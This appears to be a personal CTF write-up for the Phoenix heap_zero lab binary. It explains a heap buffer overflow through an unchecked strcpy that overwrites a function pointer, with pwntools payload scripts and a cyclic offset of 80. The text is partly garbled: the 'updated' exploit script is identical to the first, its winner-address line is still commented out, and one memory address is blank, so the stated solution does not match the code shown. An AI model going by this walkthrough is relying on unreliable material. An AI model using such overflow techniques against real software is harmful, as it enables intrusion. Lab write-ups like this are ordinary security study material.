---
title: Phoenix - heap_zero
date: 2026-07-01 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix heap_zero ctf but no source code
toc: true
---


## Introduction
I will be explaining how i did the challenge heap_zero from the series Phoenix found at <https://exploit.education/phoenix/heap-zero/> . 

## Inspecting decompiled code
__Figure 1__: Displayed below is a screenshot of the decompiled function `main`.

![](assets/posts/PWN/phoenix_heap_zero/decompiled.png)


Based on __Figure1__,  i made the following key observations. Firstly, two pointers `__dest` and `__puVar1` exist with each of them pointing to a chunk of memory with each chunk being `0x40` (64 bytes)in size as shown abovedly, the memory address that `_puVar1` contains the address of the function `nowinner` as shown below. Thirdly, the argument provided by the user is copied into the memory address pointed to by `__dest`.Thirdly, as __strcpy__ does not check the length of input in this function , this leaves it vulnerable to a buffer overflow attack. 


## Proving if buffer overflow attack works. 
To prove that buffer overflow attack succeeds in altering the memory address that will be called later on, i will be using using a 100 bytes length cyclic payload generated from pwntools using the script shown below. 

```
from pwn import *

# configuration

binary_path="./heap_zero"
context.log_level='debug'

# Craft payload/ arg

argv = cyclic(100)
#argv += p32(0x080491b6)

# Run binary with arg

args = [binary_path,argv]
io = process(args)
io.interactive()

```
__Figure 2__: Displayed below is a screenshot of the output from the script provided above. 


![](assets/posts/PWN/phoenix_heap_zero/figure2.png)


Based on __Figure 2__, i observed that the program tried to access the memory `` which does not exist. When running the command `pwn cyclic -l 0x61616175`, it returned an output of 80. This meant the memory address that the program will attempt to execute starts at byte 80. Following this observation, i ran `disassemble winner` to retrieve the memory address of the __winner__ function to append to my payload at byte 80 as shown in my updated script as shown below.


```
from pwn import *

# configuration

binary_path="./heap_zero"
context.log_level='debug'

# Craft payload/ arg

argv = cyclic(100)
#argv += p32(0x080491b6)

# Run binary with arg

args = [binary_path,argv]
io = process(args)
io.interactive()
```

__Figure 3__: Displayed below is a screenshot showing the successful completion of heap_zero

![](assets/posts/PWN/phoenix_heap_zero/figure3.png)












